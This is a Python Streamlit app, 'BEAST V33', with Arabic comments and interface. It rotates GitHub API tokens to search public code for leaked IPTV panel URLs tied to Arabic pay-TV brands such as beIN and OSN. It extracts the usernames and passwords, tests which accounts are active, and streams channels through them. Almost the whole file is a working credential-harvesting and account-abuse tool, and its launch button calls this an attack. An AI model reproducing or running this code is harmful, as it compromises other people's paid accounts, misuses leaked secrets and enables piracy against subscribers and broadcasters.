import streamlit as st
import requests
import re
import time
import threading

# --- إعدادات BEAST V33 ---
st.set_page_config(page_title="BEAST V33 - ARABIC MONSTER", layout="wide")

if "hits" not in st.session_state: st.session_state.hits = []
if "auth" not in st.session_state: st.session_state.auth = False

# نظام الدخول
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V33 - ARABIC MONSTER</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("Unlock System"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تصميم الواجهة (Dark Mode Pro)
st.markdown("""
<style>
    .stApp { background-color: #050505; color: white; }
    .hit-card { 
        background: #0d1117; border: 1px solid #30363d; 
        padding: 15px; border-radius: 10px; margin-bottom: 10px;
        border-right: 5px solid #00ff41;
    }
    .package-badge { background: #ff4b4b; color: white; padding: 2px 8px; border-radius: 5px; font-size: 12px; margin-left: 5px; }
    .server-link { color: #58a6ff; text-decoration: none; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

# --- المحرك القناص ---
def arabic_hunter(tokens, pages):
    # كلمات بحث تستهدف المحتوى العربي تحديداً
    arabic_targets = ["beIN", "SSC", "SHAHID", "OSN", "MY_HD", "ARABIC", "NILESAT"]
    base_queries = [
        'get.php?username=', 
        'player_api.php?username=',
        'extension:m3u "http://"'
    ]
    
    t_count = len(tokens)
    t_idx = 0
    
    for target in arabic_targets:
        for query in base_queries:
            full_dork = f'{query} "{target}"'
            for page in range(1, pages + 1):
                headers = {'Authorization': f'token {tokens[t_idx % t_count]}', 'Accept': 'application/vnd.github.v3+json'}
                try:
                    search_url = f"https://api.github.com/search/code?q={full_dork}&page={page}&per_page=100&sort=indexed"
                    res = requests.get(search_url, headers=headers).json()
                    
                    if "items" not in res:
                        t_idx += 1 # التبديل للتوكن التالي عند الحظر
                        continue
                    
                    for item in res['items']:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        content = requests.get(raw_url, timeout=2).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for host, user, pw in matches:
                            if any(h['host'] == host and h['user'] == user for h in st.session_state.hits): continue
                            
                            try:
                                # فحص السيرفر ومحتواه العربي
                                api = f"{host}/player_api.php?username={user}&password={pw}"
                                check = requests.get(api, timeout=2).json()
                                
                                if check.get("user_info", {}).get("status") == "Active":
                                    # جلب القوائم للتأكد من وجود باقات عربية
                                    cats = requests.get(f"{api}&action=get_live_categories", timeout=2).json()
                                    cat_names = [c['category_name'] for c in cats] if isinstance(cats, list) else []
                                    
                                    # فلترة: هل يحتوي فعلاً على محتوى عربي؟
                                    found_ar = [name for name in cat_names if any(word in name.upper() for word in arabic_targets)]
                                    
                                    st.session_state.hits.append({
                                        "host": host, "user": user, "pw": pw,
                                        "cats": cat_names[:10],
                                        "ar_cats": found_ar[:3]
                                    })
                            except: continue
                except: 
                    t_idx += 1
                    continue

# --- الواجهة ---
with st.sidebar:
    st.title("⚙️ BEAST V33 CONTROL")
    tokens_input = st.text_area("أدخل التوكنات (واحد في كل سطر):", height=150)
    pages_to_scan = st.slider("عمق البحث (صفحات لكل توكن):", 5, 100, 20)
    
    if st.button("🚀 بدء الهجوم العربي الشامل"):
        t_list = [t.strip() for t in tokens_input.split('\n') if t.strip()]
        if t_list:
            threading.Thread(target=arabic_hunter, args=(t_list, pages_to_scan), daemon=True).start()
            st.success("تم إطلاق المحرك في الخلفية...")
        else: st.error("أدخل توكنات!")

# --- عرض النتائج والمشغل ---
st.subheader(f"📊 السيرفرات المكتشفة: {len(st.session_state.hits)}")

# تقسيم الشاشة: النتائج على اليمين، المشغل على اليسار
col_res, col_play = st.columns([1, 1.2])

with col_res:
    for idx, srv in enumerate(reversed(st.session_state.hits)):
        with st.container():
            st.markdown(f"""
            <div class="hit-card">
                <span class="server-link">{srv['host']}</span><br>
                <small>User: {srv['user']} | Pass: {srv['pw']}</small><br>
                <div style="margin-top:5px;">
                    {" ".join([f"<span class='package-badge'>{c}</span>" for c in srv['ar_cats']])}
                </div>
                <p style="font-size:10px; color:#888; margin-top:5px;">📁 قوائم أخرى: {' | '.join(srv['cats'])}</p>
            </div>
            """, unsafe_allow_html=True)
            if st.button(f"📺 تشغيل السيرفر #{len(st.session_state.hits)-idx}", key=f"btn_{idx}"):
                st.session_state.active_srv = srv

with col_play:
    if "active_srv" in st.session_state:
        s = st.session_state.active_srv
        st.info(f"اتصال نشط بـ: {s['host']}")
        
        # جلب القنوات
        try:
            api_ch = f"{s['host']}/player_api.php?username={s['user']}&password={s['pw']}&action=get_live_streams"
            streams = requests.get(api_ch, timeout=5).json()
            
            search_ch = st.text_input("🔍 بحث عن قناة عربية (OSN, beIN...):")
            
            st.markdown("<div style='height:400px; overflow-y:auto; background:#111; padding:10px;'>", unsafe_allow_html=True)
            for ch in streams:
                if search_ch.lower() in ch['name'].lower():
                    if st.button(f"▶ {ch['name']}", key=f"ch_{ch['stream_id']}", use_container_width=True):
                        st.session_state.current_url = f"{s['host']}/live/{s['user']}/{s['pw']}/{ch['stream_id']}.ts"
            st.markdown("</div>", unsafe_allow_html=True)
            
            if "current_url" in st.session_state:
                st.video(st.session_state.current_url)
                st.code(st.session_state.current_url)
        except:
            st.error("السيرفر لا يستجيب لطلبات البث المباشر.")
